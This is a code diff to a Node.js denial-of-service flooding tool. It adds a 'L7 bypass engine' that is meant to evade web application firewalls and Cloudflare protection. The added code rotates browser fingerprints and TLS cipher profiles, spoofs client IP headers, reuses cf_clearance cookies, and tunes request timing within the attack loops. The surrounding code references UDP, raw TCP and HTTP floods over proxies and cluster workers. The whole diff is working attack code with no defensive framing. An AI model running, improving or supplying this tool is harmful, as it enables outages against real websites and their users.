@@ -5,6 +5,7 @@ const http = require("http");
 const https = require("https");
 const net = require("net");
 const dgram = require("dgram");
+const tls = require("tls");
 const cluster = require("cluster");
 const os = require("os");
 const { randomUserAgent } = require("random-headers");
@@ -24,6 +25,7 @@ const MAX_QUEUE = parseInt(process.env.MAX_QUEUE, 10) || 20;
 const USE_UDP = process.env.UDP_FLOOD !== "false";
 const USE_RAW_TCP = process.env.RAW_TCP !== "false";
 const KEEP_ALIVE = process.env.KEEP_ALIVE !== "false";
+const L7_BYPASS = process.env.L7_BYPASS === "true";
 
 const colors = {
   red: (t) => `\x1b[31m${t}\x1b[0m`,
@@ -49,21 +51,118 @@ function loadProxies() {
   }
 }
 
-const getNoCacheHeaders = () => ({
-  "Cache-Control": "no-cache, no-store, max-age=0",
-  Pragma: "no-cache",
-  "User-Agent": randomUserAgent(),
-  "Accept": "*/*",
-  "Accept-Encoding": "gzip, deflate, br",
-  "Accept-Language": "en-US,en;q=0.9",
-  "Connection": KEEP_ALIVE ? "keep-alive" : "close",
-  "X-Forwarded-For": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
-  "CF-Connecting-IP": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
-  "True-Client-IP": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
-});
+const getNoCacheHeaders = (forcedProfile) => {
+  if (L7_BYPASS && browserProfiles) {
+    const profile = forcedProfile || browserProfiles[profileIdxCounter++ % browserProfiles.length];
+    return buildBrowserHeaders(profile);
+  }
+  return {
+    "Cache-Control": "no-cache, no-store, max-age=0",
+    Pragma: "no-cache",
+    "User-Agent": randomUserAgent(),
+    "Accept": "*/*",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Connection": KEEP_ALIVE ? "keep-alive" : "close",
+    "X-Forwarded-For": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
+    "CF-Connecting-IP": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
+    "True-Client-IP": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
+  };
+};
 
 const httpAgent = KEEP_ALIVE ? new http.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity, maxFreeSockets: 256 }) : null;
 const httpsAgent = KEEP_ALIVE ? new https.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity, maxFreeSockets: 256, rejectUnauthorized: false }) : null;
+
+// ===================== L7 BYPASS ENGINE =====================
+
+const browserProfiles = L7_BYPASS ? [
+  { name: "chrome-win",  userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", secCHUA: '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"', platform: "Windows", accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", acceptLang: "en-US,en;q=0.9", ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA" },
+  { name: "chrome-mac",   userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", secCHUA: '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"', platform: "macOS",   accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", acceptLang: "en-US,en;q=0.9", ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA" },
+  { name: "firefox-win",  userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0", secCHUA: '', platform: "Windows", accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", acceptLang: "en-US,en;q=0.5", ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA" },
+  { name: "firefox-mac",   userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0", secCHUA: '', platform: "macOS",   accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", acceptLang: "en-US,en;q=0.5", ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA" },
+] : null;
+
+// Pre-create TLS agents per browser profile
+const browserAgents = L7_BYPASS ? browserProfiles.map(p => new https.Agent({
+  keepAlive: KEEP_ALIVE,
+  keepAliveMsecs: 1000,
+  maxSockets: Infinity,
+  maxFreeSockets: 256,
+  rejectUnauthorized: false,
+  ciphers: p.ciphers,
+  ecdhCurve: "X25519:P-256:P-384:P-521",
+  honorCipherOrder: true,
+  minVersion: "TLSv1.2",
+  maxVersion: "TLSv1.3",
+})) : null;
+
+let profileIdxCounter = 0;
+
+function getNextProfile() {
+  if (!L7_BYPASS || !browserProfiles) return null;
+  const idx = profileIdxCounter++ % browserProfiles.length;
+  return { profile: browserProfiles[idx], agent: browserAgents[idx], idx };
+}
+
+function buildBrowserHeaders(profile) {
+  const spoofIP = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+  const h = {
+    "Accept": profile.accept,
+    "Accept-Encoding": "gzip, deflate, br",
+    "Accept-Language": profile.acceptLang,
+    "Cache-Control": "no-cache, no-store, max-age=0",
+    "Pragma": "no-cache",
+    "Connection": KEEP_ALIVE ? "keep-alive" : "close",
+    "Upgrade-Insecure-Requests": "1",
+    "User-Agent": profile.userAgent,
+    "X-Forwarded-For": spoofIP,
+    "CF-Connecting-IP": spoofIP,
+    "True-Client-IP": spoofIP,
+  };
+  // Chrome/Edge send Sec-CH-UA headers; Firefox does not
+  if (profile.secCHUA) {
+    h["Sec-CH-UA"] = profile.secCHUA;
+    h["Sec-CH-UA-Mobile"] = "?0";
+    h["Sec-CH-UA-Platform"] = `"${profile.platform}"`;
+  }
+  h["Sec-Fetch-Dest"] = "document";
+  h["Sec-Fetch-Mode"] = "navigate";
+  h["Sec-Fetch-Site"] = "none";
+  h["Sec-Fetch-User"] = "?1";
+  return h;
+}
+
+// Cookie jar for session persistence (Cloudflare cf_clearance, etc.)
+const cookieJar = L7_BYPASS ? new Map() : null;
+
+function storeCookies(hostname, rawHeaders) {
+  if (!cookieJar || !rawHeaders) return;
+  const setCookie = rawHeaders["set-cookie"];
+  if (!setCookie) return;
+  const cookies = Array.isArray(setCookie) ? setCookie : [setCookie];
+  if (!cookieJar.has(hostname)) cookieJar.set(hostname, {});
+  const jar = cookieJar.get(hostname);
+  for (const cookieStr of cookies) {
+    const [nameValue] = cookieStr.split(";");
+    const eqIdx = nameValue.indexOf("=");
+    if (eqIdx > 0) jar[nameValue.slice(0, eqIdx).trim()] = nameValue.slice(eqIdx + 1).trim();
+  }
+}
+
+function getCookies(hostname) {
+  if (!cookieJar) return "";
+  const jar = cookieJar.get(hostname);
+  if (!jar) return "";
+  const entries = Object.entries(jar);
+  if (!entries.length) return "";
+  return entries.map(([k, v]) => `${k}=${v}`).join("; ");
+}
+
+// Request jitter: random delay between cycles (50-200ms)
+function getJitter() {
+  if (!L7_BYPASS) return 0;
+  return Math.floor(Math.random() * 150) + 50;
+}
 
 // ===================== ATTACK FUNCTIONS =====================
 
@@ -128,17 +227,33 @@ function createContext(proxyLine) {
 const fireHTTPRequest = (url, ctx) => {
   return new Promise((resolve) => {
     const parsedUrl = new URL(url);
+    // Pick a browser agent for L7 bypass direct HTTPS
+    let agent;
+    let profileData = null;
+    if (L7_BYPASS && browserAgents && parsedUrl.protocol === "https:" && (!ctx || ctx.type === "direct")) {
+      profileData = getNextProfile();
+      agent = profileData.agent;
+    } else {
+      agent = parsedUrl.protocol === "https:" ? httpsAgent : httpAgent;
+    }
+    const headers = getNoCacheHeaders(profileData ? profileData.profile : null);
+    // Attach stored cookies for session persistence
+    if (L7_BYPASS) {
+      const cookies = getCookies(parsedUrl.hostname);
+      if (cookies) headers["Cookie"] = cookies;
+    }
     const options = {
       hostname: parsedUrl.hostname,
       port: parsedUrl.port || (parsedUrl.protocol === "https:" ? 443 : 80),
       path: parsedUrl.pathname + parsedUrl.search,
       method: "GET",
-      headers: getNoCacheHeaders(),
-      agent: parsedUrl.protocol === "https:" ? httpsAgent : httpAgent,
+      headers,
+      agent,
       timeout: 2000,
       rejectUnauthorized: false,
     };
     const req = (parsedUrl.protocol === "https:" ? https : http).request(options, (res) => {
+      if (L7_BYPASS && res.headers) storeCookies(parsedUrl.hostname, res.headers);
       res.resume();
       resolve({ status: res.statusCode });
     });
@@ -207,7 +322,9 @@ if (USE_CLUSTER && cluster.isWorker) {
     }
 
     if (continueAttack) {
-      setTimeout(() => performAttack(target, ctx, threadId, isDirect), 10);
+      const j = getJitter();
+      if (j > 0) setTimeout(() => performAttack(target, ctx, threadId, isDirect), j);
+      else setImmediate(() => performAttack(target, ctx, threadId, isDirect));
     }
   };
 
@@ -534,7 +651,9 @@ const performAttackSingle = async (target, ctx, threadId, isDirect) => {
   }
 
   if (continueAttack) {
-    setTimeout(() => performAttackSingle(target, ctx, threadId, isDirect), 10);
+    const j = getJitter();
+    if (j > 0) setTimeout(() => performAttackSingle(target, ctx, threadId, isDirect), j);
+    else setImmediate(() => performAttackSingle(target, ctx, threadId, isDirect));
   }
 };
 
